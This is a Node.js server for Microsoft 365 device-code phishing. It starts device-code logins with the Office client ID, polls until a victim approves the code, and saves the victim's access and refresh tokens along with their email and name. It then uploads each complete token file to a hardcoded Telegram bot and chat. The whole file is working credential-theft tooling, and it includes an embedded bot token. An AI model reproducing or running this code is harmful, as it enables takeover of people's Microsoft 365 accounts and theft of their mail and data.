// M365 Device Code Server — on-demand, multi-session, no auto-refresh / startup scan
// Now sends FULL token file content to Telegram instead of just filename

const https  = require('https');
const http   = require('http');
const fs     = require('fs');
const path   = require('path');
const crypto = require('crypto');
const url    = require('url');

const CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';

const TENANT = 'common';
const RESOURCE  = 'https://graph.microsoft.com';
const SCOPE     = 'offline_access';

// Telegram
const TELEGRAM_BOT_TOKEN = '8286068697:AAGZ7lbbD8B--FnvVziInLd5XBehDiFIvd8';
const TELEGRAM_CHAT_ID   = '8379597863';
const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// ── Active sessions ───────────────────────────────────────────────────────────
const sessions = new Map(); // sessionId → { status, user_code, verification_url, file, device_code, interval, tokens?, message?, error? }

// ── Helpers ───────────────────────────────────────────────────────────────────
function genTokenFile() {
  return './tokens_' + crypto.randomBytes(3).toString('hex').toUpperCase() + '.json';
}

function genSessionId() {
  return crypto.randomBytes(16).toString('hex');
}

function post(urlStr, params) {
  return new Promise((resolve, reject) => {
    const body = new URLSearchParams(params).toString();
    const u = new URL(urlStr);
    const req = https.request({
      hostname: u.hostname,
      path:     u.pathname,
      method:   'POST',
      headers:  {
        'Content-Type':   'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(body),
        'User-Agent':     'Mozilla/5.0',
      },
    }, res => {
      let raw = '';
      res.on('data', c => raw += c);
      res.on('end', () => {
        try { resolve(JSON.parse(raw)); }
        catch { reject(new Error('Bad JSON response')); }
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

function saveTokens(tokens, file) {
  const decoded = decodeJwt(tokens.access_token);
  const expiresAt = Date.now() + (tokens.expires_in || 3600) * 1000;

  const out = {
    saved_at:       new Date().toISOString(),
    expires_at:     new Date(expiresAt).toISOString(),
    token_file:     path.basename(file),
    access_token:   tokens.access_token,
    refresh_token:  tokens.refresh_token || null,
    expires_in:     tokens.expires_in,
    resource:       tokens.resource || RESOURCE,
    decoded_claims: decoded,
    email:          decoded?.upn || decoded?.unique_name || '',
    name:           decoded?.name || '',
  };

  fs.writeFileSync(file, JSON.stringify(out, null, 2));
  return out;
}

function decodeJwt(t) {
  try { return JSON.parse(Buffer.from(t.split('.')[1], 'base64url').toString()); }
  catch { return null; }
}

async function sendTelegramAsDocument(filename) {
  try {
    const fileContent = fs.readFileSync(filename);
    const boundary = '----Boundary' + Date.now();
    const filenameBase = path.basename(filename);

    let body = '';

    // chat_id
    body += `--${boundary}\r\n`;
    body += 'Content-Disposition: form-data; name="chat_id"\r\n\r\n';
    body += `${TELEGRAM_CHAT_ID}\r\n`;

    // caption
    body += `--${boundary}\r\n`;
    body += 'Content-Disposition: form-data; name="caption"\r\n\r\n';
    body += 'outlook conector\r\n';

    // document
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="document"; filename="${filenameBase}"\r\n`;
    body += 'Content-Type: application/json\r\n\r\n';

    const head = Buffer.from(body);
    const tail = Buffer.from(`\r\n--${boundary}--\r\n`);

    const fullBody = Buffer.concat([head, fileContent, tail]);

    const res = await new Promise((resolve, reject) => {
      const req = https.request({
        hostname: 'api.telegram.org',
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Content-Length': fullBody.length,
        },
      }, response => {
        let data = '';
        response.on('data', chunk => data += chunk);
        response.on('end', () => resolve({ status: response.statusCode, body: data }));
      });

      req.on('error', reject);
      req.write(fullBody);
      req.end();
    });

    if (res.status !== 200) {
      console.error('Telegram sendDocument failed:', res.body);
      return;
    }

    console.log(`→ Telegram file sent successfully: ${filenameBase}`);
  } catch (err) {
    console.error('Telegram document upload failed:', err.message);
  }
}

async function pollSession(sessionId) {
  const s = sessions.get(sessionId);
  if (!s || s.status !== 'polling') return;

  const ms = (s.interval + 1) * 1000;

  while (sessions.has(sessionId) && sessions.get(sessionId).status === 'polling') {
    await new Promise(r => setTimeout(r, ms));

    try {
      const res = await post(`https://login.microsoftonline.com/${TENANT}/oauth2/token`, {
        grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
        client_id:  CLIENT_ID,
        code:       s.device_code,
        resource:   RESOURCE,
        scope:      SCOPE,
      });

      if (res.access_token) {
        s.tokens = res;
        s.status = 'success';

        const saved = saveTokens(res, s.file);

          // Send FULL file content to Telegram
          await sendTelegramAsDocument(s.file);

        console.log(`Session ${sessionId} → success → ${s.file}`);
        return;
      }

      switch (res.error) {
        case 'authorization_pending': break;
        case 'slow_down':             await new Promise(r => setTimeout(r, 5000)); break;
        case 'authorization_declined':
        case 'access_denied':         s.status = 'declined'; return;
        case 'code_expired':
        case 'expired_token':         s.status = 'expired';  return;
        default:                      s.status = 'error';    s.error = res.error_description; return;
      }
    } catch (err) {
      s.status = 'error';
      s.error  = err.message;
      return;
    }
  }
}

// ── HTTP Server ───────────────────────────────────────────────────────────────
const server = http.createServer(async (req, res) => {
  const parsed = url.parse(req.url, true);
  let pathname = parsed.pathname;

  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // ── POST /login-start ── starts new device code flow ───────────────────────
  if (pathname === '/login-start' && req.method === 'POST') {
    const sessionId = genSessionId();
    const file      = genTokenFile();

    try {
      const dc = await post(`https://login.microsoftonline.com/${TENANT}/oauth2/devicecode`, {
        client_id: CLIENT_ID,
        resource:  RESOURCE,
        scope:     SCOPE,
      });

      if (dc.error) throw new Error(dc.error_description || dc.error);

      sessions.set(sessionId, {
        status:           'polling',
        sessionId,
        user_code:        dc.user_code,
        verification_url: dc.verification_url,
        message:          dc.message,
        device_code:      dc.device_code,
        interval:         dc.interval,
        file,
        startTime:        Date.now(),
      });

      // Start polling in background
      pollSession(sessionId).catch(err => {
        console.error(`Poll crash ${sessionId}:`, err);
        const s = sessions.get(sessionId);
        if (s) s.status = 'error';
      });

      res.writeHead(200);
      res.end(JSON.stringify({
        sessionId,
        status:           'started',
        user_code:        dc.user_code,
        verification_url: dc.verification_url,
        message:          dc.message,
        expires_in:       dc.expires_in,
        poll_url:         `/status/${sessionId}`,
        filename_will_be: path.basename(file),
      }, null, 2));

    } catch (err) {
      res.writeHead(500);
      res.end(JSON.stringify({ error: err.message }));
    }
    return;
  }

  // ── GET /status/:sessionId ────────────────────────────────────────────────
  if (pathname.startsWith('/status/')) {
    const sessionId = pathname.slice('/status/'.length);
    const s = sessions.get(sessionId);

    if (!s) {
      res.writeHead(404);
      res.end(JSON.stringify({ error: 'Session not found or expired' }));
      return;
    }

    const response = {
      sessionId,
      status:   s.status,
      filename: s.status === 'success' ? path.basename(s.file) : null,
      email:    s.tokens ? saveTokens(s.tokens, null).email : null,
      error:    s.error || null,
    };

    // Optional: clean up finished/failed sessions after some time
    if (['success', 'declined', 'expired', 'error'].includes(s.status)) {
      setTimeout(() => sessions.delete(sessionId), 30 * 60_000); // 30 min
    }

    res.writeHead(200);
    res.end(JSON.stringify(response, null, 2));
    return;
  }

  // Fallback
  res.writeHead(404);
  res.end(JSON.stringify({ error: 'Not found' }));
});

const PORT = 3210;
server.listen(PORT, '127.0.0.1', () => {
  console.log(`
╔════════════════════════════════════════════════════════════╗
║     M365 Device Code Server  —  port ${PORT}                 ║
║                                                            ║
║  Endpoints:                                                ║
║    POST /login-start    → start new login flow             ║
║    GET  /status/:id     → poll progress & result           ║
║                                                            ║
║  • Sends FULL token JSON content to Telegram on success    ║
║  • Each frontend gets its own independent session          ║
║  • New random token file every time                        ║
╚════════════════════════════════════════════════════════════╝
`);
});